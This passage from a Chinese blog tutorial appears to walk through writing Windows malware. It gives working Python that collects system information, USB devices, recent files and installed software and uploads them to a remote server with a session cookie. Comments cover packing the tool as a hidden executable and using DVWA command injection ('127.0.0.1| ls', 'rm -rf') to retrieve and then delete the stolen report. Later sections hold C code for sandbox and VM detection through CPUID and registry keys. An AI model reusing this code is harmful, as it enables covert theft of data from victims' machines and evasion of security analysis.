&#x27;N/A&#x27;</span></span><br><span class="line">                )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取设备信息的过程中发生异常，捕获异常并将错误信息添加到 usb_devices 字符串中</span></span><br><span class="line">        usb_devices += <span class="string">f&quot;Error retrieving USB device information: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回包含所有USB设备信息的字符串</span></span><br><span class="line">    <span class="keyword">return</span> usb_devices</span><br></pre></td></tr></table></figure><h3 id="获取历史文件"><a href="#获取历史文件" class="headerlink" title="获取历史文件"></a>获取历史文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_recent_files</span>():</span><br><span class="line">    <span class="comment"># 初始化一个字符串，用于存储所有最近访问文件的信息</span></span><br><span class="line">    get_recent_files_list = <span class="string">&quot;=== Recent文件 ===\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 访问 Windows Shell API</span></span><br><span class="line">        <span class="comment"># Dispatch 创建一个 Shell.Application 对象，用于与 Windows Shell 进行交互</span></span><br><span class="line">        shell = win32com.client.Dispatch(<span class="string">&quot;Shell.Application&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取指定的命名空间，此处 0x08 对应于 Windows 的 &#x27;Recent&#x27; 文件夹</span></span><br><span class="line">        namespace = shell.NameSpace(<span class="number">0x08</span>)  <span class="comment"># 0x08 是系统中“最近使用的文件”文件夹的命名空间标识符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果无法获取 &#x27;Recent&#x27; 文件夹的命名空间，返回错误信息</span></span><br><span class="line">        <span class="keyword">if</span> namespace <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法获取 &#x27;Recent&#x27; 文件夹的命名空间\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取 &#x27;Recent&#x27; 文件夹中的所有项目</span></span><br><span class="line">        items = namespace.Items()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将文件夹中的文件数量添加到结果字符串中</span></span><br><span class="line">        get_recent_files_list += <span class="string">f&quot;Recent 文件夹中的文件数量: <span class="subst">&#123;items.Count&#125;</span>\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历每个项目，将其名称添加到结果字符串中</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            get_recent_files_list += <span class="string">f&quot;<span class="subst">&#123;item.Name&#125;</span>\n&quot;</span>  <span class="comment"># 文件名称</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 返回包含所有最近访问文件的信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> get_recent_files_list</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在访问 &#x27;Recent&#x27; 文件夹的过程中发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;无法访问 &#x27;Recent&#x27; 文件夹: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Systeminfo"><a href="#Systeminfo" class="headerlink" title="Systeminfo"></a>Systeminfo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_info</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化一个字符串，用于存储系统信息</span></span><br><span class="line">        system_info = <span class="string">&quot;\n=== 系统信息 ===\n&quot;</span>     </span><br><span class="line">        <span class="comment"># 使用 subprocess 模块执行命令行命令</span></span><br><span class="line">        <span class="comment"># 调用 `systeminfo` 命令以获取系统的详细信息</span></span><br><span class="line">        <span class="comment"># check_output 函数执行命令并返回其输出，参数解释：</span></span><br><span class="line">        <span class="comment"># - &quot;systeminfo&quot;：要执行的命令</span></span><br><span class="line">        <span class="comment"># - shell=True：在命令行的shell中执行命令</span></span><br><span class="line">        <span class="comment"># - text=True：将输出解码为文本字符串（相当于设置 `universal_newlines=True`）</span></span><br><span class="line">        output = subprocess.check_output(<span class="string">&quot;systeminfo&quot;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)   </span><br><span class="line">        <span class="comment"># 将获取的系统信息输出添加到 system_info 字符串中</span></span><br><span class="line">        system_info += output</span><br><span class="line">        <span class="comment"># 返回包含所有系统信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> system_info</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在执行命令时发生错误，捕获 CalledProcessError 异常</span></span><br><span class="line">        <span class="comment"># 返回包含错误信息的字符串，指示获取系统信息失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;获取系统信息失败: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="获取已安装软件"><a href="#获取已安装软件" class="headerlink" title="获取已安装软件"></a>获取已安装软件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_installed_software</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化一个字符串，用于存储已安装软件的信息</span></span><br><span class="line">        installed_software = <span class="string">&quot;\n=== 已安装软件 ===\n&quot;</span></span><br><span class="line">        <span class="comment"># 使用 subprocess 模块执行命令行命令</span></span><br><span class="line">        <span class="comment"># 调用 `wmic product list brief` 命令以获取已安装的软件列表的简要信息</span></span><br><span class="line">        <span class="comment"># check_output 函数执行命令并返回其输出，参数解释：</span></span><br><span class="line">        <span class="comment"># - &quot;wmic product list brief&quot;：要执行的命令，用于列出已安装软件的简要信息</span></span><br><span class="line">        <span class="comment"># - shell=True：在命令行的shell中执行命令</span></span><br><span class="line">        <span class="comment"># - text=True：将输出解码为文本字符串（在 Python 3.7 及以上版本中，text=True 等效于 universal_newlines=True）</span></span><br><span class="line">        output = subprocess.check_output(<span class="string">&quot;wmic product list brief&quot;</span>, shell=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 将获取的已安装软件信息输出添加到 installed_software 字符串中</span></span><br><span class="line">        installed_software += output</span><br><span class="line">        <span class="comment"># 返回包含所有已安装软件信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> installed_software</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在执行命令时发生错误，捕获 CalledProcessError 异常</span></span><br><span class="line">        <span class="comment"># 返回包含错误信息的字符串，指示获取已安装软件失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;获取已安装软件失败: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">url, cookie, info</span>):</span><br><span class="line">    <span class="comment"># 构造HTTP请求的头部信息</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,      <span class="comment"># &#x27;Referer&#x27;头部，通常用于标识请求来源页面</span></span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: cookie     <span class="comment"># &#x27;Cookie&#x27;头部，用于在请求中附带会话或状态信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造表单数据项</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;MAX_FILE_SIZE&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>,  <span class="comment"># 表单中指定的文件大小限制，单位为字节（这里为100KB）</span></span><br><span class="line">        <span class="string">&#x27;Upload&#x27;</span>: <span class="string">&#x27;Upload&#x27;</span>          <span class="comment"># 表单中可能的一个字段，表示上传操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造要上传的文件信息</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;uploaded&#x27;</span>: (               <span class="comment"># 表单中对应文件上传字段的名称</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;os.getlogin()&#125;</span>---info.txt&#x27;</span>,  <span class="comment"># 上传文件的名称，使用当前登录用户名拼接固定字符串</span></span><br><span class="line">            info,                   <span class="comment"># 文件的内容，通过info参数传入</span></span><br><span class="line">            <span class="string">&#x27;text/plain&#x27;</span>            <span class="comment"># 文件的MIME类型，这里指定为纯文本</span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 requests 库发送HTTP POST请求</span></span><br><span class="line">    requests.post(</span><br><span class="line">        url,            <span class="comment"># 目标URL</span></span><br><span class="line">        headers=headers,  <span class="comment"># 请求头部信息</span></span><br><span class="line">        data=data,        <span class="comment"># 表单数据项</span></span><br><span class="line">        files=files       <span class="comment"># 要上传的文件信息</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    report = (</span><br><span class="line">            <span class="string">&quot;=== 系统综合信息报告 ===\n&quot;</span></span><br><span class="line">            + check_cpu_virtualization() + check_language()</span><br><span class="line">            + get_cpu_info() + get_user()</span><br><span class="line">            + get_process_count() + check_start_time()</span><br><span class="line">            + check_sandbox_dlls() + get_disk_info()</span><br><span class="line">            + get_all_mac_addresses() + get_usb_devices()</span><br><span class="line">            + get_recent_files() + get_current_directory_and_app_name()</span><br><span class="line">            + get_system_info() + get_installed_software()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> report</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 打包流程:</span></span><br><span class="line">    <span class="comment">#     1. python -m venv venv</span></span><br><span class="line">    <span class="comment">#     2. venv\Scripts\activate</span></span><br><span class="line">    <span class="comment">#     3. pip install -r requirements.txt</span></span><br><span class="line">    <span class="comment">#     4. pyinstaller --onefile --noconsole --clean --strip box.py</span></span><br><span class="line">    <span class="comment"># 信息下载</span></span><br><span class="line">    <span class="comment">#     1. dvwa: host/vulnerabilities/exec/#</span></span><br><span class="line">    <span class="comment">#     2. 127.0.0.1| ls ../../hackable/uploads/</span></span><br><span class="line">    <span class="comment">#     3. 访问: http://&#123;host&#125;/hackable/uploads/&#123;user&#125;---info.txt</span></span><br><span class="line">    <span class="comment">#     4. 删除 127.0.0.1| rm -rf ../../hackable/uploads/&#123;user&#125;---info.txt</span></span><br><span class="line">    <span class="comment">#     5. 再次确认是否删除 127.0.0.1| ls ../../hackable/uploads/</span></span><br><span class="line">    upload_file(<span class="string">&#x27;http://***.***.***.***/vulnerabilities/upload/&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;PHPSESSID=0c64j18co158fig75btom3icr3; security=low&#x27;</span>, main())</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301085.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301181.png" data-fancybox="true"/></div></div><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>反虚拟化是指检测恶意软件是否运行在虚拟机&#x2F;沙盒上而不是物理机器上，这可以通过多种方式完成：</p><ul><li>检查屏幕分辨率：如果你在一个自动沙盒上，一些简单的指标，如屏幕分辨率可能会让你放弃。</li><li>检查I&#x2F;O设备（鼠标，键盘等）：自动沙盒不会有I&#x2F;O设备，因为它们不用于日常机器或虚拟机，它们仅用于分析恶意软件。</li><li>检查正在运行的进程或系统上的文件：简单地枚举机器上当前正在运行的进程将给你提示，如果它是一个只运行默认进程的沙箱，或者是一个具有许多基本使用应用程序的实际机器。</li><li>使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount">GetTickCount（）</a>用于确定PE是否正在调试,通过确定运行二进制文件所需的时间并在执行过程中重新检查它.您可以查看是否有断点延迟执行:添加两个任意<code>GetTickCount()</code>函数,存储T并硬编码.<ul><li>T是您的程序从第一个函数调用到第二个函数调用的时间，假设为50秒。然后，您可以在目标机器上执行恶意软件时添加检查，如果T超过50秒，这意味着有人可能正在调试您的exe。（您可能会为不同处理器之间的性能差异添加误差幅度）</li></ul></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301302.png" data-fancybox="true"/></div></div><h3 id="Cpuid"><a href="#Cpuid" class="headerlink" title="Cpuid"></a>Cpuid</h3><p><a href="https://learn.microsoft.com/zh-cn/cpp/intrinsics/cpuid-cpuidex?view=msvc-170">__Cpuid()</a>:这是一个函数，如果检测到Hypervisor供应商，它将为我们提供有关Hypervisor供应商的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getCpuInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// cpuInfo数组现在包含CPU的基本信息</span></span><br><span class="line">    <span class="comment">// cpuInfo[0] - EAX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[1] - EBX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[2] - ECX寄存器内容</span></span><br><span class="line">    <span class="comment">// cpuInfo[3] - EDX寄存器内容</span></span><br><span class="line">    <span class="type">int</span> cpuInfo[<span class="number">4</span>];  <span class="comment">// 用于存储CPUID指令的返回值</span></span><br><span class="line">    __cpuid(cpuInfo, <span class="number">0</span>);  <span class="comment">// 执行CPUID指令并获取信息    </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>参数1是一个整型数组，通常有四个元素，用于存储从EAX、EBX、ECX和EDX寄存器返回的值。</li><li>参数2是一个整数，用于指定要查询的 CPUID 信息的功能参数（即功能号）<ol><li>0:  返回最大支持的功能号，以及厂商ID字符串。</li><li>1:  返回处理器的版本信息、特征标志等。</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckCpuid1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>]; </span><br><span class="line">    <span class="comment">// 调用CPUID指令，使用功能号1，获取处理器信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查ECX寄存器的第31位是否被设置</span></span><br><span class="line">    <span class="type">int</span> bit = (cpuinfo[<span class="number">2</span>] &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>); </span><br><span class="line">    <span class="keyword">if</span> (bit) <span class="comment">// 如果第31位被设置</span></span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cpuid 第 31 bit 被设置为 1,检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CPUID.01h.ECX:31</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们将leef从0x1更改为<a href="https://knowledge.broadcom.com/external/article/340368/mechanisms-to-determine-if-software-is-r.html">0x40000000</a>，我们将获得供应商信息。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301545.png" data-fancybox="true"/></div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CheckCpuid2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>]; <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">0x40000000</span>); <span class="comment">// 调用CPUID指令，使用功能号0x40000000，获取虚拟化厂商的签名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 超级管理程序厂商签名存储在cpuinfo的1、2、3号索引中</span></span><br><span class="line">    <span class="type">char</span> vendor[<span class="number">13</span>]; <span class="comment">// 用于存储厂商字符串</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vendor, &amp;cpuinfo[<span class="number">1</span>], <span class="number">4</span>); <span class="comment">// 复制信息到vendor</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vendor + <span class="number">4</span>, &amp;cpuinfo[<span class="number">2</span>], <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(vendor + <span class="number">8</span>, &amp;cpuinfo[<span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">    vendor[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 设置字符串结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t虚拟机管理程序供应商: %s\n&quot;</span>, vendor); <span class="comment">// 打印虚拟化厂商签名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span>  <span class="comment">// 用于使用 __cpuid</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">CheckCpuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> cpuinfo[<span class="number">4</span>];  <span class="comment">// 用于存储CPUID指令返回的信息</span></span><br><span class="line">    <span class="comment">// 第一次调用 CPUID 指令，使用功能号 1，获取处理器信息</span></span><br><span class="line">    __cpuid(cpuinfo, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查 ECX 寄存器的第 31 位是否被设置</span></span><br><span class="line">    <span class="type">int</span> bit = (cpuinfo[<span class="number">2</span>] &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bit) &#123;  <span class="comment">// 如果第 31 位被设置</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] cpuid 第 31 bit 被设置为 1, 检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 第二次调用 CPUID 指令，使用功能号 0x40000000，获取虚拟化厂商的签名</span></span><br><span class="line">        __cpuid(cpuinfo, <span class="number">0x40000000</span>);</span><br><span class="line">        <span class="comment">// 超级管理程序厂商签名存储在 cpuinfo 的 1、2、3 号索引中</span></span><br><span class="line">        <span class="type">char</span> vendor[<span class="number">13</span>];  <span class="comment">// 用于存储厂商字符串</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vendor, &amp;cpuinfo[<span class="number">1</span>], <span class="number">4</span>);  <span class="comment">// 复制信息到 vendor</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vendor + <span class="number">4</span>, &amp;cpuinfo[<span class="number">2</span>], <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(vendor + <span class="number">8</span>, &amp;cpuinfo[<span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">        vendor[<span class="number">12</span>] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 设置字符串结束符</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;虚拟机管理程序供应商: %s\n&quot;</span>, vendor);  <span class="comment">// 打印虚拟化厂商签名</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有检测到虚拟处理器，返回 FALSE</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] 未检测到虚拟处理器\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CheckCpuid();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ul><li>HyperV : <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters</code></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301694.png" data-fancybox="true"/></div></div><p>在hostname和Physical Hostname中，您可以找到物理主机名和主机的域名。</p><ul><li>VirtualBox：对于<code>VirtualBox</code>，只有在使用<code>VirtualBox</code>的客户机上才能找到注册表项<code>HKEY_LOCAL_MACHINE\HARDWARE\ACPI\DSDT\VBOX__</code></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301853.png" data-fancybox="true"/></div></div><p>VMware：<code>HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301704.png" data-fancybox="true"/></div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">CheckHypervisor</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hkey;  <span class="comment">// 用于存储打开注册表项的句柄</span></span><br><span class="line">    LONG Result;  <span class="comment">// 用于存储注册表操作的返回值</span></span><br><span class="line">    BYTE data[<span class="number">256</span>], data2[<span class="number">256</span>];  <span class="comment">// 用于存储从注册表中查询的值</span></span><br><span class="line">    DWORD dataSize = <span class="keyword">sizeof</span>(data);  <span class="comment">// 存储数据大小，用于查询注册表值时用</span></span><br><span class="line">    DWORD dwType = REG_SZ;  <span class="comment">// 指定注册表值的数据类型（字符串类型）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否在 Hyper-V 中运行</span></span><br><span class="line">    Result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters&quot;</span>, <span class="number">0</span>, KEY_READ | KEY_WOW64_64KEY, &amp;hkey);</span><br><span class="line">    <span class="keyword">if</span> (Result == ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="comment">// 如果能够成功打开注册表项，表示在 Hyper-V 中运行</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前运行在 Hyper-V 虚拟机中\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询虚拟机名称</span></span><br><span 